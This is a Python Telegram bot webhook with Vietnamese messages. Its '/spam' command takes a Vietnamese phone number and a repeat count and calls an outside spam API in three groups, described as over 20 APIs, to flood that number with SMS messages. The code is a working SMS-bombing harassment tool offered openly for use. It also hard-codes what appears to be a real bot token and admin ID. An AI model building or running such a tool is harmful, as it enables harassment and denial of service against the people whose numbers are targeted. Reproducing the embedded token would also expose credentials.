from http.server import BaseHTTPRequestHandler
import json
import datetime
import re
import requests
import time

BOT_TOKEN = '7884631997:AAEVPMrLWmMfGZ3ZunEAjdfQh2G0Osf8MDM'
ADMIN_ID = '7211752234'

def TimeStamp():
    return str(datetime.date.today())

def send_telegram(chat_id, text):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    try:
        requests.post(url, json={
            'chat_id': chat_id,
            'text': text
        }, timeout=10)
    except Exception as e:
        print(f"Lỗi gửi tin nhắn: {e}")

def call_spam_api(phone, amount, group):
    try:
        url = f'https://bot-6tdh.vercel.app/api/spam?phone={phone}&amount={amount}&group={group}'
        requests.get(url, timeout=8)
        return True
    except:
        return False

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(b"Bot Telegram hoat dong!")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            update = json.loads(post_data)
        except:
            self.send_response(400)
            self.end_headers()
            return

        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            text = message.get('text', '')
            first_name = message['from'].get('first_name', 'Ban')

            response_text = ""

            if text == '/start':
                response_text = f'''👋 Chào {first_name}!
🤖 SMS Bot - Spam đa nền tảng

📋 Lệnh:
/spam <SĐT> <LẦN> - Spam SMS (tối đa 10)
/help - Hướng dẫn
/admin - Thông tin Admin'''

            elif text == '/help':
                response_text = '''📋 DANH SÁCH LỆNH:
━━━━━━━━━━━━━━━━━
/spam {SĐT} {LẦN} ✅
/help ✅
/admin ✅
━━━━━━━━━━━━━━━━━
📌 Ví dụ: /spam 0987654321 5'''

            elif text == '/admin':
                response_text = '''👤 ADMIN: @hoanganhmeta.
━━━━━━━━━━━━━━━━━
📞 Zalo: https://zalo.me/g/hoanganhmeta.
📺 YouTube: @hoanganhmeta.
🌐 Web: https://linkbio.co/hoanganhmeta.'''

            elif text.startswith('/spam'):
                parts = text.split()
                
                if len(parts) < 3:
                    response_text = '❌ Nhập: /spam <SĐT> <LẦN>\nVD: /spam 0987654321 5'
                else:
                    phone = parts[1]
                    lap = parts[2]

                    if not lap.isnumeric():
                        response_text = '❌ Số lần phải là số!'
                    elif int(lap) > 10:
                        response_text = '❌ Tối đa 10 lần!'
                    elif int(lap) < 1:
                        response_text = '❌ Phải lớn hơn 0!'
                    elif not re.search(r"^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", phone):
                        response_text = '❌ SĐT không hợp lệ!'
                    else:
                        # Gọi spam 3 nhóm API
                        call_spam_api(phone, lap, '1')
                        time.sleep(0.5)
                        call_spam_api(phone, lap, '2')
                        time.sleep(0.5)
                        call_spam_api(phone, lap, '3')
                        
                        response_text = f'''✅ ĐÃ GỬI SPAM!
━━━━━━━━━━━━━━━━━
📱 SĐT: {phone}
🔄 Lần: {lap}
📋 Nhóm: 1+2+3 (20+ API)
👤 Bởi: {first_name}
📅 Ngày: {TimeStamp()}
━━━━━━━━━━━━━━━━━
⚠️ SMS đến chậm 1-5 phút!'''

            else:
                response_text = '🤖 Gõ /help để xem lệnh!'

            if response_text:
                send_telegram(chat_id, response_text)

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"ok": True}).encode())
